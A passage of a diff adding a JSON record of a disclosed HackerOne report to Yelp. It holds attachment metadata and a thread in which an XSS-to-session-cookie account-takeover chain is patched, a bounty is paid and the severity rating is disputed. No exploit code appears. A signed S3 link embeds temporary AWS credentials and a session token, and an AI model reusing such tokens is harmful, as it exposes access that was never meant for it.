+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/slks6bnc8pn2qbylk7cm80h9byz6?response-content-disposition=attachment%3B%20filename%3D%22biz.yelp-yelp-ato-poc.mp4%22%3B%20filename%2A%3DUTF-8%27%27biz.yelp-yelp-ato-poc.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065318Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=48309cc71cc7dce9585bf8932437fbb6245ab035be2da23fc7a795cc6ab8e91c",
+      "file_size": 14265351,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-09-09T20:15:02.833Z",
+  "allow_singular_disclosure_after": -1161495.396080057,
+  "singular_disclosure_allowed": true,
+  "vote_count": 78,
+  "voters": [
+    "betull",
+    "bug4y0u",
+    "0xcyborg",
+    "mamrezzsr",
+    "n1m0",
+    "renniepak",
+    "hacktus",
+    "bogdantcaciuc",
+    "folklor",
+    "hulkvision_",
+    "and 68 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 43913,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.yelp.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 23060197,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi there!\n\nThanks for submitting your report to us! Please expect a response within a week.\n\nBest,\nThe Yelp Security Team\n",
+      "automated_response": true,
+      "created_at": "2023-07-28T23:12:10.761Z",
+      "updated_at": "2023-07-28T23:12:10.761Z",
+      "actor": {
+        "url": "/yelp",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Yelp"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "yelp"
+    },
+    {
+      "id": 23060598,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Hi @lil_endian,\n\nThanks for the detailed report once again. We've deployed a patch for the XSS described in the beginning of your report, and we'll have more on the rest of it next week,\n\nThanks,\nYelp Security",
+      "automated_response": false,
+      "created_at": "2023-07-29T01:15:35.198Z",
+      "updated_at": "2023-07-29T01:15:35.198Z",
+      "actor": {
+        "username": "calvinli",
+        "cleared": false,
+        "verified": false,
+        "url": "/calvinli",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "yelp"
+    },
+    {
+      "id": 23262311,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hi @lil_endian,\n\nWe've pushed additional patches that increase the security of the cookie bridge, and now consider this report resolved.\n\nBest,\nYelp Security",
+      "automated_response": false,
+      "created_at": "2023-08-10T20:14:14.995Z",
+      "updated_at": "2023-08-10T20:14:14.995Z",
+      "actor": {
+        "username": "calvinli",
+        "cleared": false,
+        "verified": false,
+        "url": "/calvinli",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "lil_endian",
+        "url": "/lil_endian"
+      },
+      "genius_execution_id": null,
+      "team_handle": "yelp"
+    },
+    {
+      "id": 23262313,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-08-10T20:14:27.205Z",
+      "updated_at": "2023-08-10T20:14:27.205Z",
+      "actor": {
+        "url": "/yelp",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Yelp"
+        }
+      },
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "yelp",
+      "collaborator": {
+        "username": "lil_endian",
+        "url": "/lil_endian"
+      }
+    },
+    {
+      "id": 23262319,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-08-10T20:15:02.768Z",
+      "updated_at": "2023-08-10T20:15:02.768Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "calvinli",
+        "cleared": false,
+        "verified": false,
+        "url": "/calvinli",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "yelp"
+    },
+    {
+      "id": 23263486,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for the bounty!\n\n$3000 implies this report has been rewarded as a mid-range medium severity. After finding the initial XSS  I put a lot of time and effort into coming up with a way to leak the victims `HttpOnly` session cookies to bump the impact and severity to High, so I'm a little disappointed if my efforts were wasted. I'm curious why you would only consider this a medium and not a high. Do you disagree with the CVSS score?\n\nI intend to spend more time hacking on Yelp, so understanding how you rate bugs is really helpful.",
+      "automated_response": false,
+      "created_at": "2023-08-11T00:50:00.417Z",
+      "updated_at": "2023-08-11T00:50:00.417Z",
+      "actor": {
+        "username": "lil_endian",
+        "cleared": false,
+        "verified": false,
+        "url": "/lil_endian",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9twt9d0lw2i8ezf2u95l60ovgxpu/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "yelp"
+    },
+    {
+      "id": 23354174,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@calvinli bumping just in case you missed my question above :)",
+      "automated_response": false,
+      "created_at": "2023-08-17T15:06:41.480Z",
+      "updated_at": "2023-08-17T15:06:41.480Z",
+      "actor": {
+        "username": "lil_endian",
+        "cleared": false,
+        "verified": false,
+        "url": "/lil_endian",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9twt9d0lw2i8ezf2u95l60ovgxpu/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "yelp"
+    },
+    {
+      "id": 23431148,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@calvinli bump again",
+      "automated_response": false,
+      "created_at": "2023-08-23T07:12:43.338Z",
+      "updated_at": "2023-08-23T07:12:43.338Z",
+      "actor": {
+        "username": "lil_endian",
+        "cleared": false,
+        "verified": false,
+        "url": "/lil_endian",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9twt9d0lw2i8ezf2u95l60ovgxpu/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "yelp"
+    },
+    {
+      "id": 23492272,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I'd really appreciate an answer here...",
+      "automated_response": false,
+      "created_at": "2023-08-28T12:44:41.703Z",
+      "updated_at": "2023-08-28T12:44:41.703Z",
+      "actor": {
+        "username": "lil_endian",
+        "cleared": false,
+        "verified": false,
+        "url": "/lil_endian",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9twt9d0lw2i8ezf2u95l60ovgxpu/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "yelp"
+    },
+    {
+      "id": 23492339,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-08-28T12:50:52.960Z",
+      "updated_at": "2023-08-28T12:50:52.960Z",
+      "additional_data": {
+        "old_severity": "High (8.8)",
+        "new_severity": "Medium",
+        "old_severity_id": 2122390,
+        "new_severity_id": 2166077
+      },
+      "actor": {
+        "username": "lorenzo-yelp",
+        "cleared": false,
+        "verified": false,
+        "url": "/lorenzo-yelp",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "yelp"
+    },
+    {
+      "id": 23492415,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello @lil_endian,\n\nOur internal assessment of this report gave a CVSS score of 6.4 and the bounty paid was based on that. We stand by our decision to award $3000 and won't be increasing it at this time. That being said, we appreciate your quality report and look forward to read about anything else you may find.\n\nBest,\nThe Yelp Security Team",
+      "automated_response": false,
+      "created_at": "2023-08-28T12:57:48.673Z",
+      "updated_at": "2023-08-28T12:57:48.673Z",
+      "actor": {
+        "username": "lorenzo-yelp",
+        "cleared": false,
+        "verified": false,
+        "url": "/lorenzo-yelp",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "yelp"
+    },
+    {
+      "id": 23492640,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Can you please share the CVSS score metrics you used to rate this issue then?\n\nYou made 2 changes based on this report (fixed the XSS issue, and made changes to the cookie bridge) so I'm a little disappointed if you've rated this as a plain old XSS issue.",
+      "automated_response": false,
+      "created_at": "2023-08-28T13:17:17.786Z",
+      "updated_at": "2023-08-28T13:17:17.786Z",
+      "actor": {
+        "username": "lil_endian",
+        "cleared": false,
+        "verified": false,
+        "url": "/lil_endian",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9twt9d0lw2i8ezf2u95l60ovgxpu/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "yelp"
+    },
+    {
+      "id": 23505680,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello @lil_endian,\n\nThis is the CVSS v3.1 Vector we used to calculate the score `AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N`.\n\nI should also clarify that our bounty amounts does not depend only on the CVSS score, but on other factors too. In this case, we took into consideration the likelihood of this vulnerability being exploited, hence why we awarded $3000.\n\nPlease keep banging away on the Yelps. We'd love to see what else you find.\n\nBest,\nThe Yelp Security Team\n",
+      "automated_response": false,
+      "created_at": "2023-08-29T07:28:00.777Z",
+      "updated_at": "2023-08-29T07:28:00.777Z",
+      "actor": {
+        "username": "lorenzo-yelp",
+        "cleared": false,
+        "verified": false,
+        "url": "/lorenzo-yelp",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "yelp"
+    },
+    {
+      "id": 23507314,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Setting \"Privileges Required\" to \"Low\" makes no sense when an attacker can immediately bootstrap themselves from having no account to creating a free business account in less than a minute.\n\nI don't really agree with the attack complexity being \"High\" either. There's no \"conditions beyond the attacker's control\" besides the user interaction which is captured by the \"User Interaction\" being set to \"required\". In my poc I manually created the cookie bridge link, because it's a proof of concept. A small script would be able to create the link, and the attack would be 100% deterministic, and require no manual work from the attacker.\n\nI get that you're not going to change your mind, so I'll stop arguing.\n\nBut one final thing I want to mention. You said:\n\n>I should also clarify that our bounty amounts does not depend only on the CVSS score, but on other factors too. In this case, we took into consideration the likelihood of this vulnerability being exploited\n\nI really think you should put this disclaimer in the program description. If the severity will be lowered because it's deemed unlikely that an attacker will put in the effort to find it / exploit it, people should know that before spending time looking for complex issues and chains.\n\nAnyway, I'll get back to hacking on Yelp now.\n",
+      "automated_response": false,
+      "created_at": "2023-08-29T08:12:50.666Z",
+      "updated_at": "2023-08-29T08:12:50.666Z",
+      "actor": {
+        "username": "lil_endian",
+        "cleared": false,
+        "verified": false,
+        "url": "/lil_endian",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9twt9d0lw2i8ezf2u95l60ovgxpu/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "yelp"
+    },
+    {
+      "id": 23666453,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-09-08T07:22:23.644Z",
+      "updated_at": "2023-09-08T07:22:23.644Z",
+      "actor": {
+        "username": "lil_endian",
+        "cleared": false,
+        "verified": false,
+        "url": "/lil_endian",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9twt9d0lw2i8ezf2u95l60ovgxpu/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "yelp"
+    },
+    {
+      "id": 23666454,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-09-08T07:22:23.879Z",
+      "updated_at": "2023-09-08T07:22:23.879Z",
+      "actor": {
+        "username": "lil_endian",
+        "cleared": false,
+        "verified": false,
+        "url": "/lil_endian",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9twt9d0lw2i8ezf2u95l60ovgxpu/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "yelp"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
